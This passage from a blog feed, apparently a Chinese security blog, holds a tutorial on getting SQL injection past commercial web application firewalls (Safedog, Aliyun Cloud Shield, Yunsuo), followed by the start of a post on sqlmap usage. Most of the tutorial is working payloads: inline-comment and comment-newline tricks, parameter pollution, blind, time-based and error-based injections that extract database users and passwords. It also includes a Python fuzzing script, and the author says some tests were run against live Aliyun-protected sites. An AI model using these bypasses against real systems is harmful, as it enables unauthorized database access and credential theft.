个思路</p>\n<ol>\n<li>\n<p>用其他字符替换 and 或者 or</p>\n</li>\n<li>\n<p>带入的不是字符串和数字型，带入一个特殊符号</p>\n</li>\n</ol>\n<p>针对第一种我们可以去看看运算符号 随便找到几个 <code>| ^ xor &amp; / * &amp;&amp; ||</code>  等等还有很多</p>\n<pre><code>mysql&gt; select '1'|1;\n+-------+\n| '1'|1 |\n+-------+\n|     1 |\n+-------+\n1 row in set (0.00 sec)\n\n\nmysql&gt; select '1'&amp;1;\n+-------+\n| '1'&amp;1 |\n+-------+\n|     1 |\n+-------+\n1 row in set (0.00 sec)\n\nmysql&gt; select '1'^1;\n+-------+\n| '1'^1 |\n+-------+\n|     0 |\n+-------+\n1 row in set (0.00 sec)\n\n\n</code></pre>\n<p>知道这个了我们带入我们的语法就很简单了 通过运算符来改变 ID 的值 查看页面是否变化 这是可行的。</p>\n<pre><code>mysql&gt; select * from admin where id ='1'|2-- +';\n    -&gt; ;\n+------+----------+----------+\n| id   | username | password |\n+------+----------+----------+\n|    3 | bdmin    | fdmin    |\n+------+----------+----------+\n1 row in set (0.00 sec)\n\nmysql&gt; select * from admin where id ='1'|1-- +';\n    -&gt; ;\n+------+----------+----------+\n| id   | username | password |\n+------+----------+----------+\n|    1 | cdmin    | bdmin    |\n+------+----------+----------+\n1 row in set (0.00 sec)\n\n</code></pre>\n<p>经过测试你还会发现他的正则不全 <code>&amp;&amp; true</code>  也是可以的。</p>\n<p>那我们可以不可以正面刚 <code>and</code>   <code>or</code>  呢，当然也是可行的，前面我们测试过  <code>and hex(1)</code>  不拦截其实已经可以拿来判断了，但是我们还要深入的探究</p>\n<p><code>and hex(1)=</code>  也是不拦截的 但是后面加入字符型和数字型他又开始拦截，所以我们可以猜测 他判断 = 左右的字符类型，经过测试就能出来很多我们想要的</p>\n<pre><code>and ~1&gt;1\n\nand hex(1)&gt;-1\n\nand hex(1)&gt;~1\n\n</code></pre>\n<p>再深入探究 你就会发现 安全狗他只在乎 数字型的正数，而不在乎负数，也就是 <code>and -2&lt;-1</code>  就能过狗，也可能是 <code>-</code>  绕过了他的正则</p>\n<h1 id=\"0x02-探索-union-select\"><a class=\"anchor\" href=\"#0x02-探索-union-select\">#</a> 0x02 探索 union select</h1>\n<ol>\n<li>内联注释绕过</li>\n</ol>\n<pre><code>union    不拦截\nselect   不拦截\nunion select 拦截\nunion 各种字符 select 拦截\nunion/*select*/ 不拦截\n\n</code></pre>\n<p>通过简单的测试我们发现安全狗还是认识我们我们的注释的符号的，所以我们就需要通过这个来绕过我们的安全狗，前面符号一章我讲过注释符号的几种，我们主要使用的是</p>\n<p>内联注释  <code>/*!/*!*/</code></p>\n<pre><code>http://192.168.59.129/Less-1/?id=1' union/*!/*!50000select*/ 1,2,3--+  拦截\n\nhttp://192.168.59.129/Less-1/?id=1' union/*!/*!5select*/ 1,2,3--+  不拦截\n\n\n</code></pre>\n<p>为什么不拦截 ，因为 50000 是他的版本号，你多一位少一位语句是不能能正常执行的，所以他就放行了，那么我们可以用 burp 来遍历这个值呢，结果的确是我们想要的</p>\n<pre><code>http://192.168.59.129/Less-1/?id=1' union/*!/*!11440select*/ 1,2,3--+ 不拦截\n\nhttp://192.168.59.129/Less-1/?id=1' union/*!11441/*!11440select*/ 1,2,3--+ 不拦截\n\nhttp://192.168.59.129/Less-1/?id=1' union/*!11440select*/ 1,2,3--+ 不拦截\n\nhttp://192.168.59.129/Less-1/?id=-1' union/*!11440/**/%0aselect*/ 1,2,3--+  不拦截\n\n</code></pre>\n<p>这句 bypass 的核心就在于版本号，然后你就感觉 fuzz 了千种姿势，但是核心还是这个，最简也是这个，万变不离其宗。<br />\n2. 注释绕过</p>\n<p>联想注释我们还知道有 -- # 那么他们可以利用吗，当然是肯定的，其实很久以前就有大佬发过这个语句了是<br />\n <code>union %23%0aselect</code>  因为这些都是单行注释，而 %0a 是换行的 url 编码，大家可以换行后用 url 编码看看，就是这个，<br />\n但是这样已经被加入规则库了，如何绕过呢 非常简单 当然这是个 fuzz 的过程，其实我只想写出思路，而不是直接给 payload。</p>\n<pre><code>union %23%0aselect 拦截\n\nunion %23select 拦截\n\nunion a%23 select 不拦截\n\nunion all%23 select 不拦截\n\nunion all%23%0a select 不拦截\n\nunion %23%0aall select 不拦截\n\n\n</code></pre>\n<p>有时候 fuzz 右边不行 不如看看左边 为什么可以加 all 这个你就得看看 mysql 手册了，其实测试到最后发现 %23%0a 中间不能加字符否则会被拦截。</p>\n<ol start=\"3\">\n<li>-- 注释绕过</li>\n</ol>\n<p>-- 其实大佬们也一样很早说了不过最初的姿势是  <code>-- %0a</code>  当然已经被加入豪华午餐了，所以我们来测试</p>\n<pre><code>union all -- %0a select 拦截\n\nunion  -- ()%0a select 拦截\n\nunion  -- 1%0a select 不拦截\n\nunion  -- hex()%0a select 不拦截\n\n</code></pre>\n<p>懂我意思吧，怎么绕出来，发挥你的现象，总之俩开花。</p>\n<ol start=\"4\">\n<li>老生常谈 hpp 被人遗忘的手法</li>\n</ol>\n<p>前面说过  <code>/**/</code>  里面的内容安全狗基本不管了，那么我们用 hpp 参数污染来绕过就很简单了<br />\n照成这个手法的原因是 web server 对参数的解析问题 在 php/apache 中 它总解析最后一个 id</p>\n<pre><code>http://192.168.59.129/Less-1/?id=-1' /*&amp;id='union select 1,user(),3 -- +*/\n\n</code></pre>\n<h1 id=\"0x03-注入\"><a class=\"anchor\" href=\"#0x03-注入\">#</a> 0x03 注入</h1>\n<p>既然绕过了  <code>union select</code>  那么注入就简单了 首先来看个  <code>user()</code>  , 因为它是被拦截的所以我们需要简单的绕过它</p>\n<pre><code>user()   拦截\nuser/**/() 拦截\nuser/**/(/**/) 拦截\nhex(user/**/(/**/)) 不拦截\n\n</code></pre>\n<p>接着就是爆库名</p>\n<pre><code>union  -- hex()%0a select 1,schema_name,3 from `information_schema`.schemata limit 1,1\n\n</code></pre>\n<p>接下来的流传都差不多了 关键点就是在于 from 后面这块 后面的我以这个  <code>information_schema.schemata</code>  为例展示几种思路可能有的不能过</p>\n<pre><code>`information_schema`.schemata\n`information_schema`.`schemata`\ninformation_schema.`schemata`\n(information_schema.schemata)\ninformation_schema/**/.schemata\n\n</code></pre>\n<h1 id=\"0x04-文末\"><a class=\"anchor\" href=\"#0x04-文末\">#</a> 0x04 文末</h1>\n<p>这么多手法又有多少人认真看了呢，认真去试过，探索。</p>\n<h1 id=\"0x00-延时过狗\"><a class=\"anchor\" href=\"#0x00-延时过狗\">#</a> 0x00 延时过狗</h1>\n<p>盲注过狗相对联合注入来说，感觉上是更简单，我们先来试试时间盲注把，比布尔稍稍灵活一点</p>\n<pre><code> if(1,1,1) 不拦截\n a if(1,1,1) 不拦截\n and if(1,1,1) 拦截\n | if(1,1,1) 不拦截\n || if(1,1,1) 拦截\n &amp;&amp; if(1,1,1) 拦截\n/*!and*/ if(1,1,1) 拦截\n /*!11440and*/ if(1,1,1) 不拦截\n andaif(1,1,1) 不拦截\n\n</code></pre>\n<p>通过上面的测试我们其实可以很简单的看出来 他是拦截的 xx if 这个语句，其中 xx 为 and 和 or 这 2 个词有点敏感，但是绕过还是可以的</p>\n<p>通过上一章的测试语句 发现版本为 11440 的 内联注释直接放行，咳咳这样后面就直接注入，感觉并不是我们这一章想要的，我们这一章来试试不用内联注释内不内绕过</p>\n<p>查阅乌云知识库发现一个小知识点  <code>and!!!1=1</code>  and 后面可以接上奇数个特殊的字符包括不限于 <code>! ~ &amp; -</code>  其他还可以自己测试 那么我们的 payload 就能构造出来了</p>\n<pre><code>and!!!if((substr((select hex(user/**/(/*!*/))),1,1)&gt;1),sleep/**/(/*!5*/),1)\n\n</code></pre>\n<p>系统函数怎绕过我就不多说了每一张就有</p>\n<h1 id=\"0x01-布尔过狗\"><a class=\"anchor\" href=\"#0x01-布尔过狗\">#</a> 0x01 布尔过狗</h1>\n<p>布尔注入过狗只能说是相对来说最简单的吧，因为可以不使用条件语句，少了一个绕过点</p>\n<pre><code>and!!!substr((select unhex(hex(user/**/(/*!*/)))),1,1)='r' 拦截\n\nand!!!substr((select unhex(hex(user/**/(/*!*/)))),1,1)=r 不拦截\n\nand!!!substr((select unhex(hex(user/**/(/*!*/)))),1,1)=1 不拦截\n\n\n</code></pre>\n<p>上面忘了说的就是这个点 =r 这里 不能使用引号，那绕过他就很简单了 什么 HEX ASCII 都行，通过测试发现 使用布尔盲注 他的过滤真的很差，我们试试 把 and 换成 &amp;&amp;</p>\n<pre><code>and substr((select hex(user/**/(/*!*/))),1,1)&gt;1 拦截\n\n/*!and*/ substr((select hex(user/**/(/*!*/))),1,1)&gt;1 拦截\n\n%26%26 substr((select hex(user/**/(/*!*/))),1,1)&gt;1 拦截\n\n/*!%26%26*/ substr((select hex(user/**/(/*!*/))),1,1)&gt;1 不拦截\n\n</code></pre>\n<h1 id=\"0x02-文末-3\"><a class=\"anchor\" href=\"#0x02-文末-3\">#</a> 0x02 文末</h1>\n<p>自己不测试 永远发现不了新东西</p>\n<h1 id=\"0x00-探索报错\"><a class=\"anchor\" href=\"#0x00-探索报错\">#</a> 0x00 探索报错</h1>\n<p>报错注入的绕过，感觉很少人提过，不少人绕过也有一定的误区吧，这里提一提</p>\n<pre><code>updatexml 不拦截\n\nupdatexml(1,2,3 不拦截\n\nupdatexml(1,2) 不拦截\n\nupdatexml(1,2,) 不拦截\n\nupdatexml(,2,1) 不拦截\n\nupdatexml(1,2,!) 拦截\n\nupdatexml(1,2,%) 拦截\n\nupdatexml(,2,1,hex()) 拦截\n\nand updatexml(1,2,3 不拦截\n\nupdatexml(1,2,3) 拦截\n\nand updatexml(1,2,3) 拦截\n\n\n</code></pre>\n<p>到这里我们 大概知道了，他的判断   <code>updatexml()</code>  的完整性 ，当里面按逗号分割出现出现 3 个字符时，就会拦截，当然有个别特殊的字符串他没过滤</p>\n<p>这样我们在括号里面做手脚的可能性很渺茫，那么我们还有 什么方法呢， 可以尝试把  <code>updatexml()</code>  函数分开，或者给 updatexml 加个外套。</p>\n<pre><code> /*updatexml*/(1,1,1) 不拦截\n\n /*!updatexml*/(1,1,1) 拦截\n\n /*!5000updatexml*/(1,1,1) 不拦截\n\n /*!11440updatexml*/(1,1,1) 不拦截\n\n</code></pre>\n<p>看来  <code>updatexml()</code>  函数我们已经绕过了 需要前面加个 运算符号了</p>\n<pre><code>and /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1)  拦截\n\nor /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1) 拦截\n\n/*!and*/ /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1) 拦截\n\n/*!%26%26*/ /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1) 不拦截\n\n/*!||*/ /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1) 不拦截\n\n/*!xor*/ /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1) 不拦截\n\n | /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1) 不拦截\n\n xor /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1) 不拦截\n\n</code></pre>\n<p>那么有没有什么可以包裹他的呢，其实我们查看 mysql 手册找到这么一个符号 开单引号 ASCII 96</p>\n<pre><code>http://192.168.130.135/Less-1/?id=1' and `updatexml`(1,(select hex(user/**/(/**/))),1)-- +\n\n</code></pre>\n<p>那么我们写个小脚本跑看看 还有没有</p>\n<pre><code>import requests\nimport urllib\n\nfor i in range(0,177):\n    url = r&quot;http://192.168.130.135/Less-1/?id=1%27%20xor%20&#123;fuzz&#125;updatexml&#123;fuzz&#125;(1,(select hex(user/**/(/**/))),1)--%20+&quot;.format(fuzz=urllib.quote(chr(i)))\n    req = requests.get(url)\n    if &quot;F6F7&quot; in req.text:\n        print len(req.text),i,urllib.quote(chr(i))\n\n</code></pre>\n<p>发现确实没有其他利用的了，当然你用前面的注释方法也是可行的</p>\n<h1 id=\"0x01-文末\"><a class=\"anchor\" href=\"#0x01-文末\">#</a> 0x01 文末</h1>\n<p>脚本只是你的一个思路衍生</p>\n<h1 id=\"0x00-矛与云盾过狗\"><a class=\"anchor\" href=\"#0x00-矛与云盾过狗\">#</a> 0x00 矛与云盾过狗</h1>\n<p>由于没有阿里云盾的试验环境，以下操作都在线上测试，总的来说阿里云还是比较不好绕的，因为对于 <code>/**/  /*!*/</code>  他是强过滤，根本不能用，我们先来测试简单语句</p>\n<pre><code>and 1=1 拦截\n\n&amp;&amp; 1=1 不拦截\n\nor 1=1 拦截\n\n|| 1=1 不拦截\n\nand 1 不拦截\n\nand 1= 拦截\n\nand = 拦截\n\nand 1&gt; 不拦截\n\nand 1&gt;1 拦截\n\nand 1&gt;a 拦截\n\nand 1&gt;! 不拦截\n\n</code></pre>\n<p>通过简单的测试我们发现，他对 &amp;&amp; || 过滤还是不是很严 ，and 的话是不让用直接接入 = 号的，综合一下前面的知识，我们可以想到几个方法。</p>\n<ol>\n<li>\n<p>不用 and 和 or</p>\n</li>\n<li>\n<p>用 and 在两边接入干扰字符</p>\n</li>\n</ol>\n<pre><code>and ~1=1   不拦截\n\nand!!!1=1  不拦截\n\nand 1-1    不拦截\n\nand true 不拦截\n\nand 1 不拦截\n\n</code></pre>\n<h1 id=\"0x01-注入\"><a class=\"anchor\" href=\"#0x01-注入\">#</a> 0x01 注入</h1>\n<ol>\n<li>盲注</li>\n</ol>\n<pre><code> and substr(1,1,1)='r' 拦截\n\n &amp;&amp;  substr(1,1,1)='r'  不拦截\n\n and!!!substr(1,1,1)='r' 不拦截\n\n and!!!substr((select),1,1)='r' 不拦截\n\n and!!!substr((select a()),1,1)='r' 不拦截\n\n and!!!substr((select user()),1,1)='r' 拦截\n\n\n</code></pre>\n<p>可以知道 select 后面加入 常见函数会被拦截，所以我们可以 使用一定的东西来分割他 但是 <code>/**/</code>  和 <code>/*!*/</code>  是不能用的，所以最后想到 就是 注释符号</p>\n<pre><code>and!!!substr((select user-- (1)%0a()),1,1)='r' 不拦截  edu\n\n\n</code></pre>\n<p>测试一会儿发现他对某些关键词拦截还是很严格的，绕过应该是可以的，一些生僻的函数加点东西 他就不会拦截</p>\n<pre><code>and!!!substr((select @@`datadir`),1,1)='D'-- + 拦截                     yq\nand!!!substr((select&#123;x @@datadir&#125;),1,1)='D' 不拦截\nand!!!substr((select&#123;x @@`datadir`&#125;),1,1)='D'-- + 不拦截\n\n</code></pre>\n<p>这里比较难的是 from 的绕过，虽然最后绕过了，但是感觉不是很完美</p>\n<pre><code>from 不拦截\n\nfrom user 不拦截\n\nselect from user 拦截                edu\n\nselect all from user 拦截\n\nselect from(user) 拦截\n\nselect from&#123;user&#125; 拦截\n\nselect from[user] 不拦截\n\nselect from [user] 拦截\n\n\n\n</code></pre>\n<p>最后想到 web+mysql 好像编码的问题 也能让解析我们的中文字符 但是这种对环境要求比较大</p>\n<pre><code>and!!!substr((select&#123;x username&#125;from（users） limit 0,1),1,1)='D'\n\nhttp://127.0.0.1/sqli/Less-1/?id=1%27 and!!!substr((select username from【users】 limit 0,1),3,1)='m'-- +\n\n</code></pre>\n<ol start=\"2\">\n<li>联合</li>\n</ol>\n<p>前面测试发现 内联注释不能使用了，只能靠括号之类的来干扰了</p>\n<pre><code>union select   不拦截\n\nunion select 1 拦截\n\nunion(select 1) 不拦截\n\nunion(select 1,2,3) 不拦截\n\n</code></pre>\n<ol start=\"3\">\n<li>报错</li>\n</ol>\n<pre><code>and `updatexml`(1,select `user`%0a(),1) \n</code></pre>\n<p><img data-src=\"2.4.1.png\" alt=\"mysql\" /></p>\n<p><img data-src=\"2.4.2.png\" alt=\"mysql\" /></p>\n<p>阿里云的需要深度探索才能绕过，规则还是比较困难的，相对于安全狗，因为 edu 和 yq 的云盾好像版本不同，绕过的手法也要不一样，具体思路就是这样的，由于我直接在官网测试的，所以可能有点问题。</p>\n<h1 id=\"我与云锁有个约会\"><a class=\"anchor\" href=\"#我与云锁有个约会\">#</a> 我与云锁有个约会</h1>\n<h2 id=\"0x00-简单and探索\"><a class=\"anchor\" href=\"#0x00-简单and探索\">#</a> 0x00 简单 and 探索</h2>\n<p>首先都是来测试下 and 的绕过</p>\n<pre><code>and 不拦截\n\nand 1 拦截\n\nand a 不拦截\n\nand 'a' 不拦截\n\nand 'a' &gt; &lt; =  拦截\n\n</code></pre>\n<p>差不多知道他的规则了 绕过来就很简单了</p>\n<pre><code>mysql&gt; select 'a'-0;\n+-------+\n| 'a'-0 |\n+-------+\n|     0 |\n+-------+\n1 row in set, 1 warning (0.00 sec)\n\nmysql&gt; select 'a'+1;\n+-------+\n| 'a'+1 |\n+-------+\n|     1 |\n+-------+\n1 row in set, 1 warning (0.00 sec)\n\nmysql&gt; select 'a'|1;\n+-------+\n| 'a'|1 |\n+-------+\n|     1 |\n+-------+\n1 row in set, 1 warning (0.00 sec)\n\n\nand 'a'-0  不拦截\n\nand 'a'|1  不拦截\n\n</code></pre>\n<h2 id=\"0x01-我与云锁有个约会\"><a class=\"anchor\" href=\"#0x01-我与云锁有个约会\">#</a> 0x01 我与云锁有个约会</h2>\n<p>早期云锁绕过非常简单，只需要在 post 和 get 同时提交数据 他会只检测 post 的内容，很轻松的绕过，但是更新后云锁也是很多人谈之色变的。</p>\n<p>以下内容都是把云锁的增强型防护开启</p>\n<ol>\n<li>简单的布尔盲注</li>\n</ol>\n<pre><code>and strcmp((substr((select user/**/()),2,1)),'0')\n\n</code></pre>\n<p>生僻函数绕过 这里比较难的点其实也在 from，但是比云盾好点，毕竟可以用到注释</p>\n<pre><code>http://192.168.130.135/Less-1/?id=1'  and strcmp((substr((select from),2,1)),'0')-- +  拦截\n\nhttp://192.168.130.135/Less-1/?id=1'  and strcmp((substr((select /*from*/),2,1)),'0')-- + 不拦截\n\n</code></pre>\n<p>看到这两条语句其实我们可以清楚的知道 <code>/**/</code>  是我们可以利用的点，结合前面的知识我们只需要把我们的 from 放在注释里面然后把注释不起作用就 OK</p>\n<pre><code>http://192.168.130.135/Less-1/?id=1'  and strcmp((substr((select password/* -- + %0afrom/**/users limit 0,1),1,1)),'D')-- +\n\n</code></pre>\n<p><img data-src=\"2.5.1.png\" alt=\"mysql\" /></p>\n<ol start=\"2\">\n<li>时间盲注</li>\n</ol>\n<p>时间盲注换换就行</p>\n<pre><code>http://192.168.130.135/Less-1/?id=1'  and if((strcmp((substr((select password/* -- + %0afrom/**/users limit 0,1),1,1)),'D')),1,sleep(5))-- +\n\n</code></pre>\n<ol start=\"3\">\n<li>报错注入</li>\n</ol>\n<pre><code>http://192.168.130.135/Less-1/?id=1'  and `updatexml`(1,concat(0x7e,(select user/**/()),0x7e),1)/**/-- +\n\n</code></pre>\n<p>其他的自己探索吧，bypass 也就一个知识量和思路的结合</p>\n<p><img data-src=\"2.5.2.png\" alt=\"mysql\" /></p>\n<h1 id=\"0x00-拓展bypass的常用思路\"><a class=\"anchor\" href=\"#0x00-拓展bypass的常用思路\">#</a> 0x00 拓展 Bypass 的常用思路</h1>\n<p>WAF 的绕过我们无非就是利用 WEB 程序缺陷，容器特性，网络协议，数据库特性来组合利用绕过，从用户发出请求到数据库的每一点，寻找突破口。</p>\n<h1 id=\"0x01-常见的手段\"><a class=\"anchor\" href=\"#0x01-常见的手段\">#</a> 0x01 常见的手段</h1>\n<ol>\n<li>\n<p>HTTP 协议</p>\n</li>\n<li>\n<p>大小混写</p>\n</li>\n<li>\n<p>替换</p>\n</li>\n<li>\n<p>使用特殊字符</p>\n</li>\n<li>\n<p>使用编码</p>\n</li>\n<li>\n<p>等价替换</p>\n</li>\n<li>\n<p>容器特性</p>\n</li>\n<li>\n<p>白名单</p>\n</li>\n<li>\n<p>缓冲溢出</p>\n</li>\n</ol>\n<p>等等</p>\n<h2 id=\"http协议\"><a class=\"anchor\" href=\"#http协议\">#</a> HTTP 协议</h2>\n<p>HTTP 协议中有很多功能，一般来说我们可以用到的就是编码功能，后来有大佬发现了分块传入来绕过 WAF，具体大家可以百度看看，大概 http 协议我们可以总结如下。</p>\n<ol>\n<li>\n<p>构造畸形数据包</p>\n</li>\n<li>\n<p>编码</p>\n</li>\n<li>\n<p>分块</p>\n</li>\n<li>\n<p>数据包溢出</p>\n</li>\n</ol>\n<p>可能有些表述有误，但是大概意思如此，构造畸形数据包的原理是 http 协议是有一定的容错性的，我们也常用这个容错性去绕过上传。编码绕过的原理也是利用程序解密，而 waf 识别不了，数据包溢出则是数据包过大 waf 自动丢弃不识别</p>\n<h2 id=\"大小混写\"><a class=\"anchor\" href=\"#大小混写\">#</a> 大小混写</h2>\n<p>大小混写一般是绕过一些简单的正则 ，对大小写敏感的。</p>\n<pre><code>UnIon SlEct \n\n</code></pre>\n<h2 id=\"替换\"><a class=\"anchor\" href=\"#替换\">#</a> 替换</h2>\n<p>这种一般是因为正则吧我们的关键词给替换删除了，但是没有进行多次匹配导致绕过</p>\n<pre><code>ununionion seselectlect\n\nun/**/ion se/**/lect\n\n</code></pre>\n<h2 id=\"特殊字符\"><a class=\"anchor\" href=\"#特殊字符\">#</a> 特殊字符</h2>\n<p>特殊符号也多是数据库的特性，利用数据库可以使用多种符号来绕过，多种的运算符</p>\n<pre><code>`updatexml`\n\nand!!!1=1\n\n/**/\n\n/*!50000*/\n\n</code></pre>\n<h2 id=\"使用编码\"><a class=\"anchor\" href=\"#使用编码\">#</a> 使用编码</h2>\n<p>这里和 http 协议差不多，多重编码等等，url 编码会自己解码一次，但是有的程序他可以自己多次解密，那么我们就可以拿来利用<br />\n还有的程序参数他是支持 base64 的 那么我们的 payload 就可以编码绕过了</p>\n<pre><code>= -&gt; %3D -&gt;%25%33%44\n\nand 1=1 -&gt; YW5kIDE9MQ==\n\n</code></pre>\n<h2 id=\"等价替换\"><a class=\"anchor\" href=\"#等价替换\">#</a> 等价替换</h2>\n<p>mysql 众多的函数也我们的 bypass 带来了很对便利，比如一个分割字符串的函数都是几个，倘若被过滤一个可以换成其他的</p>\n<pre><code>substr(version(),1,1)\nSubstring(version(),1,1)\nLeft(version(),1)\n\n</code></pre>\n<h2 id=\"容器特性\"><a class=\"anchor\" href=\"#容器特性\">#</a> 容器特性</h2>\n<ol>\n<li>iis</li>\n</ol>\n<p>容器的特性给我们绕过非常的有帮助，感谢那些善于发现的师傅们。</p>\n<pre><code>iis+asp 的%特性：当传入的 s%e%l%e%c%t 函数被%分割时，解析出来还是select\niis+asp 的unicode特性 ： iis支持Unicode的解析 我们传入s%u0065lect解析为select\n\n    +--------------------------------------------------------------------+\n    |   Keywords     |        WAF             |  ASP/ASP.NET             |\n    +--------------------------------------------------------------------+\n    | sele%ct * fr%om..  | sele%ct * fr%om..      | select * from..      |\n    | ;dr%op ta%ble xxx  | ;dr%op ta%ble xxx      | ;drop table xxx      |\n    | &lt;scr%ipt&gt;      | &lt;scr%ipt&gt;                  | &lt;script&gt;             |\n    | &lt;if%rame&gt;      | &lt;if%rame&gt;                  | &lt;iframe&gt;             |\n    +--------------------------------------------------------------------+\n\n</code></pre>\n<ol start=\"2\">\n<li>hpp</li>\n</ol>\n<p>hpp 参数污染，前面我们绕过安全狗用到过，不同容器对我们传入的值解析顺序不同，这也是我们可以利用的</p>\n<pre><code>    php+apache    &amp;id=1&amp;id=2     他只解析最后一个\n\n\n    +------------------------------------------------------------------+\n    | Web Server      | Parameter Interpretation         | Example     |\n    +------------------------------------------------------------------+\n    | ASP.NET/IIS     | Concatenation by comma       | par1=val1,val2  |\n    | ASP/IIS         | Concatenation by comma       | par1=val1,val2  |\n    | PHP/Apache      | The last param is resulting  | par1=val2       |\n    | JSP/Tomcat      | The first param is resulting | par1=val1       |\n    | Perl/Apache     | The first param is resulting | par1=val1       |\n    | DBMan           | Concatenation by two tildes  | par1=val1~~val2 |\n    +------------------------------------------------------------------+\n\n</code></pre>\n<ol start=\"3\">\n<li>HTTP Parameter Contamination</li>\n</ol>\n<p>不同的容器他会对我们的参数带入的一些特殊字符解析成不同的东西，比如</p>\n<pre><code>    +-----------------------------------------------------------+\n    | Query String    |    Web Servers response / GET values    |\n    +-----------------------------------------------------------+\n    |         | Apache/2.2.16, PHP/5.3.3 | IIS6/ASP             |\n    +-----------------------------------------------------------+\n    | ?test[1=2       | test_1=2             | test[1=2         |\n    | ?test=%         | test=%               | test=            |\n    | ?test%00=1      | test=1               | test=1           |\n    | ?test=1%001     | NULL                 | test=1           |\n    | ?test+d=1+2     | test_d=1 2           | test d=1 2       |\n    +-----------------------------------------------------------+\n\n</code></pre>\n<h2 id=\"白名单\"><a class=\"anchor\" href=\"#白名单\">#</a> 白名单</h2>\n<p>有的程序他会对本地 ip 不拦截，同时他的 host 使用 <code>X-Forwarded-For</code>  等来获取</p>\n<pre><code>X-Forwarded-For:127.0.0.1\n\n</code></pre>\n<h2 id=\"缓冲溢出\"><a class=\"anchor\" href=\"#缓冲溢出\">#</a> 缓冲溢出</h2>\n<p>waf 他处理数据包的大小有限，早期安全狗你提交过长 url 会直接奔溃</p>\n<pre><code>?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26\n\n</code></pre>\n<h2 id=\"参考文章\"><a class=\"anchor\" href=\"#参考文章\">#</a> 参考文章</h2>\n<ol>\n<li>\n<p>Obfuscate and Bypass ： <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vcGFwZXJzLzE3OTM0\">https://www.exploit-db.com/papers/17934</span></p>\n</li>\n<li>\n<p>9 ways to bypass Web Application Firewall：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZGlnaXRhbG11bml0aW9uLm1lLzIwMTgvMDIvc3FsLWluamVjdGlvbi05LXdheXMtYnlwYXNzLXdlYi1hcHBsaWNhdGlvbi1maXJld2FsbC8=\">https://www.digitalmunition.me/2018/02/sql-injection-9-ways-bypass-web-application-firewall/</span></p>\n</li>\n</ol>\n<h1 id=\"0x02-文末-4\"><a class=\"anchor\" href=\"#0x02-文末-4\">#</a> 0x02 文末</h1>\n<p>bypass 不要局限与一种，多种组合才能最大利用，你需要了解 mysql 的语法，特殊的符号，特殊的写法，FUZZ 他可以容错的地方</p>\n",
            "tags": [
                "sql注入"
            ]
        },
        {
            "id": "https://or0kit.github.io/PenetrationTest/Web-Security/SQLMAP%E6%80%BB%E7%BB%93/",
            "url": "https://or0kit.github.io/PenetrationTest/Web-Security/SQLMAP%E6%80%BB%E7%BB%93/",
            "title": "SQLMAP总结",
            "date_published": "2020-12-05T06:40:14.000Z",
            "content_html": "<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<blockquote>\n<p>总结一下 SQLmap 的使用方法。</p>\n</blockquote>\n<h1 id=\"sqlmap的简介\"><a class=\"anchor\" href=\"#sqlmap的简介\">#</a> Sqlmap 的简介</h1>\n<p>Sqlmap 是一种开源的渗透测试工具，可以自动检测和利用 SQL 注入漏洞以及接入该数据库的服务器。它拥有非常强大的检测引擎、具有多种特性的渗透测试器、通过数据库指纹提取访问底层文件系统并通过外带连接执行命令。</p>\n<p>支持的数据库：MySQL，Oracle, PostgreSQL, Microsoft SQL Ser ver, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase and SAP MAXDB。</p>\n<p>sqlmap 支持五种不同的注入模式：</p>\n<ul>\n<li>UNION query SQL injection（可联合查询注入）</li>\n<li>Error-based  SQL injection（报错型注入）</li>\n<li>Boolean-based  blind SQL injection（布尔型注入）</li>\n<li>Time-based  blind SQL injection（基于时间延迟注入）</li>\n<li>Stacked queries SQL injection（可多语句查询注入）</li>\n</ul>\n<h1 id=\"sqlmap使用\"><a class=\"anchor\" href=\"#sqlmap使用\">#</a> SQLMAP 使用</h1>\n<h2 id=\"设置目标\"><a class=\"anchor\" href=\"#设置目标\">#</a> 设置目标</h2>\n<ul>\n<li>\n<p>-u /--url 最基本格式 python sqlmap.py-u “<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy50YXJnZXQuY29tL2luZGV4LnBocD9pZD0xJUUyJTgwJTlE\">http://www.target.com/index.php?id=1”</span></p>\n</li>\n<li>\n<p>-m 从文本中获取多个目标扫描，但是每一行一个 url。sqlmap-m “urllist.txt”</p>\n</li>\n<li>\n<p>-r 从文件中加载 HTTP 请求，这样的话就不需要在去设定 Cookie,POST 数据...... 等等.sqlmap–r  “/tmp/1.txt”</p>\n</li>\n</ul>\n<h2 id=\"设置回显等级\"><a class=\"anchor\" href=\"#设置回显等级\">#</a> 设置回显等级</h2>\n<p>参数：-v 默认为 1：</p>\n<ul>\n<li>0、只显示 python 错误以及严重的信息。</li>\n<li>1、同时显示基本信息和警告信息。（默认等级）</li>\n<li>2、同时显示 debug 信息。</li>\n<li>3、同时显示注入的 payload。</li>\n<li>4、同时显示 HTTP 请求。</li>\n<li>5、同时显示 HTTP 响应头。</li>\n<li>6、同时显示 HTTP 响应页面。</li>\n</ul>\n<h2 id=\"设置http数据包相关参数\"><a class=\"anchor\" href=\"#设置http数据包相关参数\">#</a> 设置 HTTP 数据包相关参数</h2>\n<p>参数：--data<br />\n 此参数是把数以 POST 方式提交，sqlmap 会像检测 GET 参数一样检测 POST 过去的参数。</p>\n<p><code>python sqlmap.py-u &quot;http://www.target.com/vuln.php&quot; --data=&quot;id=1” </code></p>\n<p>参数：--cookie<br />\n 当 web 需要登录的时候，需要我们抓包获取 cookie 参数，然后复制出来，加到 --cookie 参数中。</p>\n<p>参数：--user-agent<br />\n 默认情况下 sqlmap 的 HTTP 请求头中的 User-Agent 值是： <code>sqlmap/1.0-dev-xxxxxxxxx(http://sqlmap.org)</code> <br />\n 这个时候可以手动指定伪造一个 User-Agent。</p>\n<p><code>sqlmap-u “http://www.target.com” --level  3 